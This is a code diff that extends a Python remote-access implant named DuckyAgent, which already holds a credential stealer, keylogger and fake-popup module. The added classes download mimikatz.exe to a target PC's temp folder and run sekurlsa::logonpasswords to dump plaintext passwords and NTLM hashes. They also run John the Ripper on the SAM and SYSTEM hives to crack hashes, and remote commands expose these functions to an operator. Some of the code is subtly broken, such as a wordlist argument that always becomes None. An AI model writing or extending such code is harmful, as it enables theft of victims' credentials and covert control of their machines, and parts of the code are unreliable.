@@ -427,6 +427,186 @@ class CredentialStealer:
         return "[encrypted]"
 
 
+# ── Mimikatz Credential Extractor ───────────────────────────────
+
+class MimikatzExtractor:
+    """Runs mimikatz on target PC to extract credentials from memory."""
+
+    def __init__(self):
+        self.work_dir = os.path.join(os.environ.get("TEMP", ""), "mimikatz")
+
+    def run(self):
+        """Execute mimikatz and return extracted credentials."""
+        results = {"status": "", "credentials": [], "raw_output": ""}
+
+        try:
+            # Download if not present
+            exe_path = os.path.join(self.work_dir, "mimikatz.exe")
+            if not os.path.exists(exe_path):
+                os.makedirs(self.work_dir, exist_ok=True)
+                dl_url = "https://github.com/gentilkiwi/mimikatz/releases/download/3.1.0/mimikatz.exe"
+                cache_path = os.path.join(os.environ.get("TEMP", ""), "mimikatz_cache")
+                urlretrieve(dl_url, exe_path)
+
+            # Run mimikatz and capture output
+            cmd = [exe_path, "sekurlsa::logonpasswords", "exit"]
+            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30, cwd=self.work_dir)
+            output = proc.stdout + proc.stderr
+
+            # Parse credentials from mimikatz output
+            creds = self._parse_mimikatz_output(output)
+            results["credentials"] = creds
+            results["raw_output"] = output[:15000]  # Limit size
+            results["status"] = f"Found {len(creds)} credential(s)" if creds else "No credentials found"
+
+        except subprocess.TimeoutExpired:
+            results["status"] = "mimikatz timed out (30s)"
+        except Exception as e:
+            results["status"] = f"Error: {str(e)}"
+
+        return results
+
+    def _parse_mimikatz_output(self, output):
+        """Parse mimikatz logonpasswords output for credentials."""
+        creds = []
+        current_cred = {}
+        in_credential_block = False
+
+        for line in output.splitlines():
+            if "username" in line.lower() and ("name" in line.lower() or "display" in line.lower()):
+                # Start of a new credential block
+                if current_cred.get("username") and current_cred.get("password"):
+                    creds.append(current_cred)
+                current_cred = {}
+                parts = line.split(":", 1)
+                if len(parts) > 1:
+                    current_cred["username"] = parts[1].strip()
+                in_credential_block = True
+
+            elif "password" in line.lower():
+                parts = line.split(":", 1)
+                if len(parts) > 1:
+                    pw = parts[1].strip().strip('"')
+                    if pw and pw != "(n/a)" and not pw.startswith("(null)"):
+                        current_cred["password"] = pw
+
+            elif "ntlm" in line.lower() or "sha1" in line.lower():
+                parts = line.split(":", 1)
+                if len(parts) > 1:
+                    val = parts[1].strip().strip('"')
+                    if val and not val.startswith("(null)"):
+                        current_cred["hash"] = val
+
+        # Don't forget the last credential block
+        if current_cred.get("username") and current_cred.get("password"):
+            creds.append(current_cred)
+
+        return creds
+
+
+# ── Hash Cracker (John the Ripper integration) ──────────────────
+
+class HashCracker:
+    """Cracks password hashes using John the Ripper or Windows tools."""
+
+    def __init__(self):
+        self.work_dir = os.path.join(os.environ.get("TEMP", ""), "john")
+
+    def crack_ntlm(self, ntlm_hash):
+        """Crack an NTLM hash using Windows built-in tools (netapi32)."""
+        try:
+            # Use John the Ripper if available, otherwise use brute force for simple passwords
+            john_exe = self._find_john()
+
+            if john_exe:
+                hash_file = os.path.join(self.work_dir, "hashes.txt")
+                os.makedirs(self.work_dir, exist_ok=True)
+                with open(hash_file, 'w') as f:
+                    f.write(f"ntml_hash:{ntlm_hash}")
+
+                result = subprocess.run(
+                    [john_exe, "--wordlist", os.path.join(os.environ.get("PROGRAMFILES", "C:\\Program Files"), "John the Ripper\\run\\wordlists\\password-cracker\\dist\\rockyou.txt") if False else None, hash_file],
+                    capture_output=True, text=True, timeout=60,
+                )
+
+                # Try to get cracked passwords
+                output = result.stdout + result.stderr
+                return {"status": "cracked", "output": output[:5000]}
+            else:
+                # Fallback: use Windows API for simple hash verification
+                return {"status": "john_not_found", "message": "John not installed, try john_crack command"}
+
+        except Exception as e:
+            return {"status": "error", "message": str(e)}
+
+    def extract_sam_hashes(self):
+        """Extract NTLM hashes from SAM database."""
+        try:
+            sam_path = os.path.join(os.environ.get("WINDIR", "C:\\Windows"), "System32\\config\\SAM")
+            system_path = os.path.join(os.environ.get("WINDIR", "C:\\Windows"), "System32\\config\\SYSTEM")
+
+            john_exe = self._find_john()
+            if not john_exe:
+                return {"status": "error", "message": "John the Ripper not found"}
+
+            result = subprocess.run(
+                [john_exe, "--format=nt", sam_path, system_path],
+                capture_output=True, text=True, timeout=60,
+            )
+            output = result.stdout + result.stderr
+            hashes = [l.strip() for l in output.splitlines() if ":" in l and len(l) > 32]
+
+            return {"status": "extracted", "hashes": hashes[:50], "raw_output": output[:10000]}
+        except Exception as e:
+            return {"status": "error", "message": str(e)}
+
+    def crack_with_wordlist(self, hash_file, wordlist=None):
+        """Run John against a file of hashes."""
+        try:
+            john_exe = self._find_john()
+            if not john_exe:
+                return {"status": "error", "message": "John the Ripper not found"}
+
+            result = subprocess.run(
+                [john_exe, "--format=nt", hash_file],
+                capture_output=True, text=True, timeout=120,
+            )
+            output = result.stdout + result.stderr
+
+            # Extract cracked passwords
+            cracked = []
+            for line in output.splitlines():
+                if ":" in line and len(line) > 32:
+                    parts = line.rsplit(":", 1)
+                    if len(parts) == 2:
+                        cracked.append({"hash": parts[0], "password": parts[1].strip()})
+
+            return {"status": "done", "cracked": cracked, "raw_output": output[:10000]}
+        except Exception as e:
+            return {"status": "error", "message": str(e)}
+
+    def _find_john(self):
+        """Find John the Ripper executable."""
+        possible_paths = [
+            os.path.join(os.environ.get("TEMP", ""), "john", "run", "win", "run64.exe"),
+            os.path.join(os.environ.get("PROGRAMFILES", "C:\\Program Files"), "John the Ripper", "run", "win", "run64.exe"),
+        ]
+
+        for path in possible_paths:
+            if os.path.exists(path):
+                return path
+
+        # Search for it
+        john_dir = os.environ.get("TEMP", "")
+        if os.path.exists(john_dir):
+            for item in os.listdir(john_dir):
+                exe = os.path.join(john_dir, item, "run", "win", "run64.exe")
+                if os.path.exists(exe):
+                    return exe
+
+        return None
+
+
 # ── Fake Popup Generator ────────────────────────────────────────
 
 class FakePopup:
@@ -502,6 +682,8 @@ class CommandHandler:
         self.keylogger = SmartKeylogger()
         self.cred_stealer = CredentialStealer()
         self.popup = FakePopup()
+        self.mimikatz = MimikatzExtractor()
+        self.cracker = HashCracker()
         self._running = True
 
     def handle(self, command, args=""):
@@ -713,6 +895,41 @@ class CommandHandler:
                 "keylogger_running": self.keylogger.running if hasattr(self, 'keylogger') else False,
             }
 
+        # ── Mimikatz ────────────────────────────────────────
+        elif cmd == "mimikatz" or cmd == "sekurlsa":
+            try:
+                result = self.mimikatz.run()
+                resp = result
+            except Exception as e:
+                resp = {"status": "error", "message": str(e)}
+
+        # ── Hash Cracking ───────────────────────────────────
+        elif cmd == "crack_hash" and arg:
+            try:
+                result = self.cracker.crack_ntlm(arg)
+                resp = result
+            except Exception as e:
+                resp = {"status": "error", "message": str(e)}
+
+        elif cmd == "john_crack" or cmd == "crack":
+            try:
+                if arg and os.path.isfile(arg):
+                    # Crack a file of hashes
+                    result = self.cracker.crack_with_wordlist(arg)
+                else:
+                    # Extract from SAM first, then crack
+                    result = self.cracker.extract_sam_hashes()
+                resp = result
+            except Exception as e:
+                resp = {"status": "error", "message": str(e)}
+
+        elif cmd == "extract_hashes" or cmd == "sam_hashes":
+            try:
+                result = self.cracker.extract_sam_hashes()
+                resp = result
+            except Exception as e:
+                resp = {"status": "error", "message": str(e)}
+
         # ── Update Agent ──────────────────────────────────────
         elif cmd == "update" or cmd == "upgrade":
             try:
@@ -738,6 +955,8 @@ class CommandHandler:
                         "open_url <url>", "popup <title> | <message>",
                         "ls /path", "cat /path", "download /path",
                         "upload <filename> <base64>", "run_script <name>",
+                        "mimikatz", "sekurlsa",
+                        "crack_hash <ntlm_hash>", "john_crack", "extract_hashes",
                         "status", "help"
                     ]}
 
@@ -989,20 +1208,20 @@ def run_agent():
 
     poll_interval = float(config.get("agent", "poll_interval", fallback=str(POLL_INTERVAL)))
 
-        # Start local HTTP server (for local access)
-        local_port = int(config.get("agent", "local_port", fallback=str(LOCAL_PORT)))
-        http_server = None
-        try:
-            httpd = HTTPServer(("127.0.0.1", local_port), AgentHTTPHandler)
-            http_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
-            http_thread.start()
-            http_server = httpd
-        except OSError as e:
-            pass  # Port already in use - that's fine
+    # Start local HTTP server (for local access)
+    local_port = int(config.get("agent", "local_port", fallback=str(LOCAL_PORT)))
+    http_server = None
+    try:
+        httpd = HTTPServer(("127.0.0.1", local_port), AgentHTTPHandler)
+        http_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
+        http_thread.start()
+        http_server = httpd
+    except OSError as e:
+        pass  # Port already in use - that's fine
 
-        # Start auto-update thread (checks every hour)
-        update_thread = threading.Thread(target=auto_update_loop, daemon=True)
-        update_thread.start()
+    # Start auto-update thread (checks every hour)
+    update_thread = threading.Thread(target=auto_update_loop, daemon=True)
+    update_thread.start()
 
     print(f"DuckyAgent v1.0 started (PID: {os.getpid()})")
     if http_server:
